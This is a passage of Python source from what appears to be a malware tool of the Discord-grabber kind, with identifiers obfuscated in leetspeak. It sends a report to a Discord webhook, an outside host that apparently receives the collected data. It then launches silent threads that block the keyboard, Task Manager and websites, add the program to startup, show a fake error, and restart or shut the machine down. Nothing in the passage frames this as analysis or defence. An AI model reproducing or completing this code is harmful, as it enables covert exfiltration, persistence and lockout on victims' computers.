    text=v4r_footer_text, 
    icon_url=v4r_avatar_embed
)

try:  
    v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
    v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
except: pass


try: threading.Thread(target=D3f_B10ckK3y).start()
except: pass
try: threading.Thread(target=D3f_B10ckT45kM4n4g3r).start()
except: pass
try: threading.Thread(target=D3f_B10ckW3b5it3).start()
except: pass
try: threading.Thread(target=D3f_St4rtup).start()
except: pass
try: threading.Thread(target=D3f_Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=D3f_R3st4rt).start()
except: pass
try: threading.Thread(target=D3f_F4k33rr0r).start()
except: pass
try: threading.Thread(target=D3f_Shutd0wn).start()
except: pass
